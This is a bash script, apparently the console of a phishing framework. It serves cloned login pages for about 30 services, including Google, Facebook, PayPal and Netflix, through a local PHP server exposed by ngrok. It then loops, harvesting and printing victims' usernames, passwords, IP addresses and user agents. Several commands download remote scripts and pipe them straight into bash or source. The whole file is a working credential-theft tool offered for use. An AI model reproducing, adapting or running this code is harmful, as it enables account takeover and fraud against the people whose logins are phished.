#!/bin/bash

__return__ () {
source __return__ &> /dev/null
if [[ ! $? == 105 ]]
then
printf 105
fi
}

__return__=$(printf "$(__return__)")

WAIT() {
sleep 0.01
}

declare -a SITES=(
Google
Facebook
Microsoft
Instagram
DeviantArt
Pinterest
Badoo
Twitch
Snapchat
Ebay
Linkedin
DropBox
Netflix
Mediafire
Gitlab
Github
Yahoo
Paypal
Quora
Wordpress
Steam
Yandex
Twitter
Spotify
StackoverFlow
Playstation
Reddit
Tiktok
Adobe
Xbox
)

declare -a SITESX=(
'Google.OTP'
'Facebook.OTP'
'Microsoft.OTP'
'Instagram.OTP'
'DeviantArt.OTP'
'Pinterest.OTP'
'Amazon.OTP'
'Twitch.OTP'
'Snapchat.OTP'
'Ebay.OTP'
'Linkedin.OTP'
'DropBox.OTP'
'Netflix.OTP'
'Paytm.OTP'
'Gitlab.OTP'
'Github.OTP'
'Yahoo.OTP'
'Paypal.OTP'
'Telegram.OTP'
'Wordpress.OTP'
'Hotstar.OTP'
'Flipkart.OTP'
'Twitter.OTP'
'Spotify.OTP'
'StackoverFlow.OTP'
'WhatsApp.OTP'
'Reddit.OTP'
'Tiktok.OTP'
'Ajio.OTP'
'Uber.OTP'
)

RANDOMs=$(echo $((1 + $RANDOM % 8)))
OS=$(uname -o | grep -o "Android")
WEBPAGEX=${#SITESX[@]}
WEBPAGE=${#SITES[@]}
CWD=$(pwd)
VAR=3.2
ARG=$1
NUM=1


C0="\e[90m"
C1="\e[91m"
C2="\e[92m"
C3="\e[93m"
C4="\e[94m"
C5="\e[95m"
C6="\e[96m"
C7="\e[97m"
R0="\e[0m"
R1="\e[1m"
R2="\e[2m"
R3="\e[3m"
R4="\e[4m"
R5="\e[5m"

function screenSize() {
    if ! hash tput &> /dev/null
    then
    apt install -y ncurses-utils
    fi

      SIZE=$(tput cols)

                if [ ! ${SIZE} -gt "56" ]
                then
                printf "\nYour Terminal window Size must be above ${C2}56${R0} >= ${C1}${SIZE}${R0}\nPinch two fingers together on the screen to zoom out.\n"
                fi
}

if [[ $OS == *'Android'* ]];then
screenSize
TMPDIR=/data/data/com.termux/files/usr/tmp
pm() {
apt install -y $1
}
else
TMPDIR=/tmp
# Package Managers
    distro=$(source /etc/os-release && echo $ID)
    case $distro in
        arch)
            pm() {
		sudo pacman -Sy --noconfirm $1
		}
            ;;
        ubuntu)
            pm() {
		sudo apt-get install -y $1
		}
            ;;
        linuxmint)
            pm() { sudo apt-get install -y $1
		}
            ;;
        kali)
            pm() { sudo apt-get install -y $1
		}
            ;;
        parrot)
            pm() { sudo apt-get install -y $1
		}
            ;;
        debian)
            pm() { sudo apt-get install -y $1
		}
            ;;
        void)
            pm() { sudo xbps-install $1
		}
            ;;
        manjaro)
            pm() { sudo pacman -Sy $1
		}
            ;;
        garuda)
            pm() { sudo pacman -Sy $1
		}
            ;;
        alpine)
            pm() { sudo apk add $1
		}
            ;;
        gentoo)
            pm() { sudo emerge --ask $1
		}
            ;;
        fedora)
            pm() { sudo dnf install -y $1
		}
            ;;
        predator)
            pm() { sudo pacman -Sy --noconfirm $1
		}
            ;;
        artix)
            pm() { sudo pacman -Sy --noconfirm $1
		}
            ;;
        puppy_fossapup64)
            pm() { sudo pkg -i $1
		}
            ;;
        raspbian)
            pm() { sudo apt install -y $1
		}
            ;;
        endeavouros)
            pm() { sudo pacman -Sy --noconfirm $1
		}
            ;;
        freebsd)
            pm() { sudo pkg install -y $1
		}
            ;;
        *)
          echo "Sorry, but your System doesn't support [package manager] !"
          # Add manualy to use package manager to start psfconsole !
            exit 0
            ;;
    esac
fi

if ! hash svn &> /dev/null
then
pm subversion
elif ! hash php &> /dev/null
then
pm php
elif ! hash git &> /dev/null
then
pm git
elif ! hash jq &> /dev/null
then
pm jq
elif ! hash curl &> /dev/null
then
pm curl
fi

interrupt () {
exit_on_signal_SIGINT () {
if [[ ! $__return__ == 105 ]];then
if [[ ${ARG} == "-s" ]];then
if [[ ${SITENUM} == ${SITENUM} ]];then
rm -rf "${SCRIPT_PATH[@]}"/"${SITENUM}" &> /dev/null
fi
else
rm -rf "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}" &> /dev/null
fi
printf "                                            \r"
echo -e "${C1}(${R0}>${C1})${R0} Interrupt program !"
exit 0
else
printf "                                            \r"
echo -e "${C1}(${R0}>${C1})${R0} Interrupt program !"
exit 0
fi
}

exit_on_signal_SIGTSTP () {
if [[ ! $__return__ == 105 ]];then
rm -rf "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}" &> /dev/null
if [[ ${ARG} == "-s" ]];then
if [[ ${SITENUM} == ${SITENUM} ]];then
rm -rf "${SCRIPT_PATH[@]}"/"${SITENUM}" &> /dev/null
fi
else
rm -rf "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}" &> /dev/null
fi
printf "                                            \r"
echo -e "${C1}(${R0}>${C1})${R0} Interrupt program !"
exit 0
else
printf "                                            \r"
echo -e "${C1}(${R0}>${C1})${R0} Interrupt program !"
exit 0
fi
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTSTP SIGTSTP
}


# <<<--- Installer --->>>

if [[ ${ARG} == "-i" || ${ARG} == "--install" ]];then
source <(curl -sLo- "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/programs/setup.psfconsole")
exit 0

elif [[ ${ARG} == "-u" || ${ARG} == "--update" ]];then
source <(curl -sLo- "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/programs/update.psfconsole")
exit 0

elif [[ ${ARG} == "-r" || ${ARG} == "--remove" ]];then
source <(curl -sLo- "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/programs/remove.psfconsole")
exit 0
fi

user_data() {
#random_ip=$(shuf -i 0-1 -n 1)
if [ -f "ip.txt" ]
then
ip=$(cat ip.txt | awk NR==2 | cut -d " " -f2)
fetch=$(cat ip.txt | awk NR==3)
user=$(printf "${fetch# User-Agent:}")

echo -e "${C2}(${R0}>${C2})${R0} IP Address : ${ip}"
echo -e "${C2}(${R0}>${C2})${R0} User Agent :${user}\n"
fi
rm ip.txt &> /dev/null
}

credentials() {
user=$(grep -o 'Username:.*' usernames.txt | awk NR==1 | cut -d " " -f2)
pass=$(grep -o 'Pass:.*' usernames.txt | awk NR==1 | cut -d ":" -f2)

if [[ ! ${#user} == 0 ]]
then
echo -e "${C2}(${R0}>${C2})${R0} Username : ${user}"
fi

if [[ ! ${#pass} == 0 ]]
then
if [[ ! ${pass} == " " ]]
then
echo -e "${C2}(${R0}>${C2})${R0} Password :${pass}\n"
fi
fi
rm usernames.txt &> /dev/null
}

function credentialLoop () {
while true
do
if [ -f "ip.txt" ]
then
user_data
fi
if [ -f "usernames.txt" ]
then
credentials
fi
done
}


# <<<--- Argument Mode ! --->>>

if [[ ${ARG} == "-s" || ${ARG} == "--site" ]];then
  if [[ ${2} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
   then
      if [[ ${2} -lt 31 ]]
       then interrupt
       SITENUM="${SITES[${2} -1]}"
       echo -e "${C4}(${R0}>${C4})${R0} Webpage : ${SITENUM}"
       if [[ ! $__return__ == 105 ]];then
       cd ${CWD}/server
       SCRIPT_PATH="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
       cd - &> /dev/null
       bash ${CWD}/programs/ngrok.installer
       source ${CWD}/programs/ngrok.configure
       cp -rf  "${CWD}"/websites/nonOTP/"${SITES[${2} -1]}" "${CWD}/server"
       cp "${SCRIPT_PATH[@]}"/ip.php "${SCRIPT_PATH[@]}"/"${SITES[${2} -1]}"
       cd "${SCRIPT_PATH[@]}"/"${SITES[${2} -1]}"
       php -S localhost:8080 > /dev/null 2>&1 &
       echo -e "\n${C4}(${R0}>${C4})${R0} Credentials details visible here !\n"
       credentialLoop
       else
       cd $TMPDIR
       if [ ! -d "$TMPDIR/server" ]
       then
       mkdir -p ${TMPDIR}/server
       fi
       cd server
       if [[ ! -d "${SITES[${2} -1]}" ]]
       then
       printf "${C4}(${R0}>${C4})${R0} Downloading webpage Template...\r"
       svn checkout https://github.com/abhackerofficial/phising-framework/trunk/websites/nonOTP/"${SITES[${2} -1]}" &> /dev/null
       fi
       cd ..
       cd ${TMPDIR}/server/"${SITES[${2} -1]}"
       printf "${C4}(${R0}>${C4})${R0} Downloading Programs for Starting Server...\r"
       curl -sLO https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/server/ip.php
       cd - &> /dev/null
       bash <(curl -sL "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/programs/ngrok.installer")
       source <(curl -sLo- "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/programs/ngrok.configure")
       cd ${TMPDIR}/server/"${SITES[${2} -1]}"
       php -S localhost:8080 > /dev/null 2>&1 &
       echo -e "\n${C4}(${R0}>${C4})${R0} Credentials details visible here !\n"
       credentialLoop
      fi
  fi
  else
  echo "(>) Choose Site as given Number !"
  exit 1
fi
exit 0
fi

if [[ ! $__return__ == 105 ]];then
bash assets/logos/logo.${RANDOMs}
else
bash <(curl -sL "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/assets/logos/logo.${RANDOMs}")
fi

printf "+ -- --=[  ${C3}psfconsole release v${VAR}${R0} ]=-- -- +\n";WAIT
printf "+ -- --=[  ${C2}${WEBPAGE} webpage - templates${R0}  ]=-- -- +\n";WAIT

echo
for i in {0..8}
  do
  printf "${C4}(${R0}0$((i+1))${C4})${R0} ${SITES[i]}\n"
  WAIT
done

for i in {9..29}
  do
  printf "${C4}(${R0}$((i+1))${C4})${R0} ${SITES[i]}\n"
  WAIT
done
echo

printf "${R4}psf${R0} > "
read input
interrupt

function setupRecourses () {
if [[ ! $__return__ == 105 ]];then
   cd ${CWD}/server
   SCRIPT_PATH="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
   cd - &> /dev/null
   bash ${CWD}/programs/ngrok.installer
   source ${CWD}/programs/ngrok.configure
else
   cd $TMPDIR
   if [ ! -d "$TMPDIR/server" ]
   then
   mkdir -p ${TMPDIR}/server
   fi
   cd server
   if [[ ! -d "${SITES[${input} -1]}" ]]
   then
   printf "${C4}(${R0}>${C4})${R0} Downloading webpage Template...\r"
   svn checkout https://github.com/abhackerofficial/phising-framework/trunk/websites/nonOTP/"${SITES[${input} -1]}" &> /dev/null
   fi
   cd ..
   cd ${TMPDIR}/server/"${SITES[${input} -1]}"
   printf "${C4}(${R0}>${C4})${R0} Downloading Programs for Starting Server...\r"
   curl -sLO https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/server/ip.php
   cd - &> /dev/null
   bash <(curl -sL "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/programs/ngrok.installer")
   source <(curl -sLo- "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/programs/ngrok.configure")
fi
}

function setupServer () {
if [ ${#link} == 0 ]
then
exit 1
fi
sleep 0.5

if [[ ! $__return__ == 105 ]];then
cp -rf  "${CWD}"/websites/nonOTP/"${SITES[${input} -1]}" "${CWD}/server"
cp "${SCRIPT_PATH[@]}"/ip.php "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}"
cd "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}"
else
cd ${TMPDIR}/server/"${SITES[${input} -1]}"
fi
}

function startServer () {
php -S localhost:8080 > /dev/null 2>&1 &
echo -e "\n${C4}(${R0}>${C4})${R0} Credentials details visible here !\n"
}


# <<<--- Input Mode ! --->>>

if [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
then
   if [[ ${input} -lt 31 ]]
   then
       setupRecourses
       setupServer
       startServer
       credentialLoop
  fi
fi

